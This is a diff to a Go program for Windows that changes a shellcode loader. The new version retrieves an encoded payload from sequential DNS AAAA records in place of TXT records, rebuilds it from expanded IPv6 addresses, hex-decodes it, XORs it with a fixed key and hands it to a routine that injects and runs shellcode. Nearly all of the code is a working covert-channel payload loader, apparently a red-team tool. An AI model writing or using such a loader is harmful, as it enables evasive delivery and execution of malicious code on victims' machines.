@@ -1,14 +1,13 @@
 package main
 
 import (
-	"encoding/base64"
 	"encoding/hex"
 	"unsafe"
 
 	"net"
 	"strconv"
 	"strings"
-	"time"
+  "time"
 
 	"github.com/miekg/dns"
 	"golang.org/x/sys/windows"
@@ -24,6 +23,21 @@ const (
 	// PAGE_READWRITE is a Windows constant used with Windows API calls
 	PAGE_READWRITE = 0x04
 )
+
+// FullIPv6 is used to expand IPv6 addresses and add in any omitted zeros or octets
+// Taken from https://stackoverflow.com/a/52003106
+func FullIPv6(ip net.IP) string {
+	dst := make([]byte, hex.EncodedLen(len(ip)))
+	_ = hex.Encode(dst, ip)
+	return string(dst[0:4]) + ":" +
+		string(dst[4:8]) + ":" +
+		string(dst[8:12]) + ":" +
+		string(dst[12:16]) + ":" +
+		string(dst[16:20]) + ":" +
+		string(dst[20:24]) + ":" +
+		string(dst[24:28]) + ":" +
+		string(dst[28:])
+}
 
 //The technique used to inject and run the payload was used from this repository https://github.com/Ne0nd0g/go-shellcode
 func runShellcode(hexShellcode string) {
@@ -57,17 +71,18 @@ func runShellcode(hexShellcode string) {
 }
 
 func retreiveShellcodeAsBytes() []byte {
+
 	//You can replace the DNS servers used to retreive the shell code, where you can define them in the format "nameserver <ip>" and separated using \n
 	reader := strings.NewReader("nameserver 8.8.8.8\nnameserver 8.8.4.4")
 	dnsConfig, _ := dns.ClientConfigFromReader(reader)
 	dnsClient := new(dns.Client)
-	txtRecords := ""
+	var dnsRecords []string
 
 	i := 0
-	// This will increment through the TXT records until it cannot find any addiitonal records
+	// This will increment through the AAAA records until it cannot find any addiitonal records
 	for {
 		dnsMessage := new(dns.Msg)
-		dnsMessage.SetQuestion(dns.Fqdn("dada"+strconv.Itoa(i)+".askar.live"), dns.TypeTXT)
+    dnsMessage.SetQuestion(dns.Fqdn("as"+strconv.Itoa(i)+"test2.local"), dns.TypeAAAA)
 		dnsMessage.RecursionDesired = true
 		dnsResponse, _, _ := dnsClient.Exchange(dnsMessage, net.JoinHostPort(dnsConfig.Servers[0], dnsConfig.Port))
 
@@ -75,18 +90,37 @@ func retreiveShellcodeAsBytes() []byte {
 			break
 		}
 
-		txtRecord := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
-		txtRecords = txtRecords + strings.Replace(txtRecord, "\"", "", -1)
-		time.Sleep(0 * 1000 * time.Millisecond)
+		ipv6Addr := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
+		dnsRecords = append(dnsRecords, ipv6Addr)
+ 		time.Sleep(0 * 1000 * time.Millisecond)
 		i++
 	}
 
-	decodedBase64, _ := base64.StdEncoding.DecodeString(txtRecords)
+	//Expand the retrieved DNS records to the full length of the octets and address
+	var expandedDNSRecords []string
+	for _, dnsRecord := range dnsRecords {
+		expandedDNSRecords = append(expandedDNSRecords, FullIPv6(net.ParseIP(dnsRecord)))
+	}
 
-	//Decode the shellcode by XORing it with the predefined key (If the shellcode is not encoded, use 0x00)
-	decodedBytes := make([]byte, len(decodedBase64))
-	for i := 0; i < len(decodedBase64); i++ {
-		decodedBytes[i] = decodedBase64[i] ^ 0x00
+	//Join all the octets from all the records to prepare it for decoding
+	encodedShellcode := ""
+	for _, dnsRecord := range expandedDNSRecords {
+		encodedShellcode = encodedShellcode + strings.Replace(dnsRecord, ":", "", -1)
+	}
+
+	//Remove any trailing zeros at the end of the last address
+	encodedShellcode = strings.TrimRight(encodedShellcode, "0")
+
+	//If the length of the shellcode is odd, add a zero to make it even
+	if len(encodedShellcode)%2 != 0 {
+		encodedShellcode = encodedShellcode + "0"
+	}
+
+	//Decode the shellcode by XORing it with the predefined key
+	decodedHex, _ := hex.DecodeString(encodedShellcode)
+	decodedBytes := make([]byte, len(decodedHex))
+	for i := 0; i < len(decodedHex); i++ {
+    decodedBytes[i] = decodedHex[i] ^ 32
 	}
 
 	return decodedBytes
